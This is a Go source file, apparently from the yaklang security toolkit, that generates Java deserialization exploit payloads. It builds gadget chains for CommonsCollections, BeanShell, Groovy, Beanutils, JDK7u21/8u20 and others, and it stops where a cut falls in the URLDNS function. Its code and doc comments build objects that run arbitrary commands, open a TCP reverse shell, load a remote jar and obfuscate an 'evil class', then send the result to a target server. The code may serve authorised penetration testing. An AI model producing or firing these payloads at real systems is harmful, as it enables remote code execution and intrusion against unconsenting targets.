package yso

import (
	"encoding/base64"
	"errors"
	"fmt"
	"strings"

	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
)

type GadgetInfo struct {
	Name                string
	GeneratorName       string
	Generator           any
	NameVerbose         string
	Help                string
	YakFun              string
	SupportTemplateImpl bool
}

func (g *GadgetInfo) GetNameVerbose() string {
	return g.NameVerbose
}
func (g *GadgetInfo) GetName() string {
	return g.Name
}
func (g *GadgetInfo) GetHelp() string {
	return g.Help
}
func (g *GadgetInfo) IsSupportTemplate() bool {
	return g.SupportTemplateImpl
}

func IsTemplateImpl(name GadgetType) bool {
	cfg, ok := YsoConfigInstance.Gadgets[name]
	if !ok {
		return false
	}
	return cfg.IsTemplateImpl
}

var AllGadgets = map[GadgetType]*GadgetInfo{}

func init() {
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		var f any
		if cfg.IsTemplateImpl {
			f = func(options ...GenClassOptionFun) (*JavaObject, error) {
				var anyOpts []any
				for _, opt := range options {
					anyOpts = append(anyOpts, opt)
				}
				return GenerateGadget(string(name), anyOpts...)
			}
		} else {
			f = func(cmd string) (*JavaObject, error) {
				return GenerateGadget(string(name), "raw_cmd", cmd)
			}
		}
		AllGadgets[name] = &GadgetInfo{
			Name:                string(name),
			NameVerbose:         string(name),
			Generator:           f,
			GeneratorName:       string(name),
			Help:                cfg.Desc,
			SupportTemplateImpl: cfg.IsTemplateImpl,
			YakFun:              fmt.Sprintf("Get%sJavaObject", name),
		}
	}
}

type JavaObject struct {
	yserx.JavaSerializable
	verbose *GadgetInfo
}

func (a *JavaObject) Verbose() *GadgetInfo {
	return a.verbose
}

var verboseWrapper = func(y yserx.JavaSerializable, verbose *GadgetInfo) *JavaObject {
	return &JavaObject{
		y,
		verbose,
	}
}

type TemplatesGadget func(options ...GenClassOptionFun) (*JavaObject, error)
type RuntimeExecGadget func(cmd string) (*JavaObject, error)

// GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:
//  1. Generate a Java object that have no any params.
//     Example: GenerateGadget("CommonsCollections1")
//  2. Generate a Java object that have one param and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param.
//     Example: GenerateGadget("CommonsCollections2", "Sleep", "1000")
//  3. Generate a Java object that have multiple params and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param map.
//     Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})
//  4. Generate a Java object that have one param and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param.
//     Example: GenerateGadget("CommonsCollections1", "dnslog", "xxx.xx.com")
//  5. Generate a Java object that have multiple params and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param map.
//     Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
//  6. Generate a Java object that implement by TemplateImpl.
//     Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))
func GenerateGadget(name string, opts ...any) (*JavaObject, error) {
	genClassOpt := []GenClassOptionFun{}
	for _, opt := range opts {
		if v, ok := opt.(GenClassOptionFun); ok {
			genClassOpt = append(genClassOpt, v)
		}
	}
	if len(genClassOpt) > 0 {
		if len(genClassOpt) == len(opts) {
			return GenerateTemplateImplGadget(name, genClassOpt...)
		} else {
			return nil, utils.Errorf("invalid param format")
		}
	}
	gadgetName := name
	funName := ""
	defaultParam := ""
	var params map[string]string

	if len(opts) == 0 {
		// no params
	} else {
		if len(opts) != 2 {
			return nil, utils.Errorf("invalid param format")
		}
		if v, ok := opts[0].(string); ok {
			funName = v
		} else {
			return nil, utils.Errorf("invalid param format")
		}
		switch ret := opts[1].(type) {
		case map[string]string:
			params = ret
		case string:
			defaultParam = ret
		}
	}

	cfg, ok := YsoConfigInstance.Gadgets[GadgetType(gadgetName)]
	if !ok {
		return nil, utils.Errorf("not found template: %s", gadgetName)
	}
	if cfg.IsTemplateImpl {
		var genClassOpts []GenClassOptionFun
		genClassOpts = append(genClassOpts, SetClassType(ClassType(funName)))
		if defaultParam != "" {
			cfg, ok := YsoConfigInstance.Classes[ClassType(funName)]
			if !ok {
				return nil, utils.Errorf("not found class: %s", funName)
			}
			if len(cfg.Params) == 1 {
				genClassOpts = append(genClassOpts, SetClassParam(string(cfg.Params[0].Name), defaultParam))
			} else {
				ps := []string{}
				for _, param := range cfg.Params {
					ps = append(ps, string(param.Name))
				}
				return nil, utils.Errorf("class `%s` need params: %s", funName, strings.Join(ps, ","))
			}
		} else {
			for k, v := range params {
				genClassOpts = append(genClassOpts, SetClassParam(k, v))
			}
		}
		return GenerateTemplateImplGadget(gadgetName, genClassOpts...)
	} else if cfg.Template == nil {
		chainType := funName
		template, ok := cfg.ChainTemplate[chainType]
		if !ok {
			return nil, utils.Errorf("not support transform chain type: `%s`", chainType)
		}
		if chainType == "mozilla_defining_class_loader" {
			if defaultParam != "" {
				bytes, err := codec.DecodeBase64(defaultParam)
				if err != nil {
					return nil, err
				}
				classObj, err := javaclassparser.Parse(bytes)
				if err != nil {
					return nil, err
				}
				className := classObj.GetClassName()
				params = map[string]string{
					"base64Class": defaultParam,
					"className":   className,
				}
				defaultParam = ""
			} else {
				base64Class, ok := params["base64Class"]
				if !ok {
					return nil, utils.Errorf("missing param: base64Class")
				}
				bytes, err := codec.DecodeBase64(base64Class)
				if err != nil {
					return nil, err
				}
				classObj, err := javaclassparser.Parse(bytes)
				if err != nil {
					return nil, err
				}
				className := classObj.GetClassName()
				params = map[string]string{
					"base64Class": defaultParam,
					"className":   className,
				}
				defaultParam = ""
			}
		}
		funMap, ok := YsoConfigInstance.ReflectChainFunction[funName]
		if !ok {
			return nil, utils.Errorf("not found transform chain function: `%s`", funName)
		}
		objs, err := yserx.ParseJavaSerialized(template)
		if err != nil {
			return nil, err
		}
		if len(objs) <= 0 {
			return nil, utils.Error("parse gadget error")
		}
		obj := objs[0]
		if defaultParam != "" {
			err = ReplaceStringInJavaSerilizable(obj, "{{param0}}", defaultParam, -1)
			if err != nil {
				return nil, err
			}
		} else {
			for i, p := range funMap.Args {
				val, ok := params[string(p.Name)]
				if !ok {
					if p.DefaultValue != "" {
						val = p.DefaultValue
						ok = true
					}
				}
				if !ok {
					return nil, errors.New("missing param: " + string(p.Name))
				}
				if p.Type == "bytes" {
					// 检测到bytes类型，使用 ReplaceByteArrayInJavaSerilizable替换占位符
					new, decodeErr := base64.StdEncoding.DecodeString(val)
					if decodeErr != nil {
						return nil, decodeErr
					}
					err = ReplaceByteArrayInJavaSerilizable(obj, []byte(fmt.Sprintf("{{param%d}}", i)), new, -1)
				} else {
					err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), val, -1)
				}
				if err != nil {
					return nil, err
				}
			}
		}
		return verboseWrapper(obj, AllGadgets[GadgetType(gadgetName)]), nil
	} else {
		template := cfg.Template
		if cfg.ReferenceFun == "" {
			objs, err := yserx.ParseJavaSerialized(template)
			if err != nil {
				return nil, err
			}
			if len(objs) <= 0 {
				return nil, utils.Error("parse gadget error")
			}
			obj := objs[0]
			return verboseWrapper(obj, AllGadgets[GadgetType(gadgetName)]), nil
		}
		funMap, ok := YsoConfigInstance.ReflectChainFunction[cfg.ReferenceFun]
		if !ok {
			return nil, utils.Errorf("config.yaml has error, not found transform chain function: `%s`", cfg.ReferenceFun)
		}
		objs, err := yserx.ParseJavaSerialized(template)
		if err != nil {
			return nil, err
		}
		if len(objs) <= 0 {
			return nil, utils.Error("parse gadget error")
		}
		obj := objs[0]
		if defaultParam != "" {
			if len(funMap.Args) != 1 {
				ps := []string{}
				for _, arg := range funMap.Args {
					ps = append(ps, string(arg.Name))
				}
				return nil, utils.Errorf("transform chain function `%s` need params: %s", cfg.ReferenceFun, strings.Join(ps, ","))
			} else {
				err = ReplaceStringInJavaSerilizable(obj, "{{param0}}", defaultParam, -1)
				if err != nil {
					return nil, err
				}
			}
		} else {
			for i, param := range funMap.Args {
				val, ok := params[string(param.Name)]
				if !ok {
					if param.DefaultValue != "" {
						val = param.DefaultValue
						ok = true
					}
				}
				if !ok {
					return nil, errors.New("missing param: " + string(param.Name))
				}
				err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), val, -1)
				if err != nil {
					return nil, err
				}
			}
		}

		return verboseWrapper(obj, AllGadgets[GadgetType(gadgetName)]), nil
	}
}

func GenerateTemplateImplGadget(name string, opts ...GenClassOptionFun) (*JavaObject, error) {
	cfg, ok := YsoConfigInstance.Gadgets[GadgetType(name)]
	if !ok {
		return nil, utils.Errorf("not found template: %s", name)
	}
	classObj, err := GenerateClass(opts...)
	if err != nil {
		return nil, err
	}
	err = JavaClassModifySuperClass(classObj, "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")
	if err != nil {
		return nil, err
	}
	//newOpts := append(opts, SetClassType(ClassTemplateImplClassLoader), SetClassBytes(classObj.Bytes()), SetClassName(utils.RandStringBytes(5)))
	//classObj, err = GenerateClass(newOpts...) // load target class by TemplateImpl loader that can load any class
	//if err != nil {
	//	return nil, err
	//}
	objs, err := yserx.ParseJavaSerialized(cfg.Template)
	if err != nil {
		return nil, err
	}
	obj := objs[0]
	err = SetJavaObjectClass(obj, classObj)
	if err != nil {
		return nil, utils.Errorf("config gadget %s class object failed: %v", name, err)
	}
	return verboseWrapper(obj, AllGadgets[GadgetType(name)]), nil
}

// GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。
// 此函数使用ParseJavaSerialized方法来解析提供的字节序列，
// 并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，
// 函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。
// byt：要解析的字节数组。
// 返回：成功时返回第一个Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// raw := "rO0..." // base64 Java serialized object
// bytes = codec.DecodeBase64(raw)~ // base64解码
// javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
// ```
func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(byt)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	return verboseWrapper(obj, &GadgetInfo{}), nil
}

// GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。
// 它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。
// cmd：要传入Java对象的命令字符串。
// 返回：成功时返回修改后的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, err := yso.GetBeanShell1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetBeanShell1), "raw_cmd", cmd)
}

// GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, err := yso.GetCommonsCollections1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections1), "raw_cmd", cmd)
}

// GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections5), "raw_cmd", cmd)
}

// GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections6), "raw_cmd", cmd)
}

// GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections7), "raw_cmd", cmd)
}

// GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollectionsK3), "raw_cmd", cmd)
}

// GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollectionsK4), "raw_cmd", cmd)
}

// GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetGroovy1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetGroovy1), "raw_cmd", cmd)
}

// GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
// 用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数允许用户定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetClick1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command),
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className),
//	)
//
// ```
func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetClick1), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(
//
//	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//		yso.obfuscationClassConstantPool(),
//		yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsBeanutils1), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。
// 去除了对 commons-collections:3.1 的依赖。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsBeanutils2_183), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。
// 去除了对 commons-collections:3.1 的依赖。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsBeanutils2), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections2), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections3JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections3), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections4JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections4), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections8JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollections8), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollectionsK1), utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetCommonsCollectionsK2), utils.InterfaceToSliceInterface(options)...)
}

// GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJBossInterceptors1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetJBossInterceptors1), utils.InterfaceToSliceInterface(options)...)
}

// GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJSON1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetJSON1), utils.InterfaceToSliceInterface(options)...)
}

// GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJavassistWeld1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetJavassistWeld1), utils.InterfaceToSliceInterface(options)...)
}

// GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJdk7u21JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetJdk7u21), utils.InterfaceToSliceInterface(options)...)
}

// GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJdk8u20JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(string(GadgetJdk8u20), utils.InterfaceToSliceInterface(options)...)
}

// GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。
// 这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
// url：要在生成的Java对象中设置的URL字符串。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// url, token, _ = risk.NewDNSLogDomain()
// javaObject, _ = yso.GetURLDNSJavaObject(url)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog查询失败
//	} else {
//	  if len(res) > 0{
//	   // dnslog查询成功
//	  }
//	}
//
// ```
func GetURLDNSJavaObject(url string) (*JavaObject, error) {
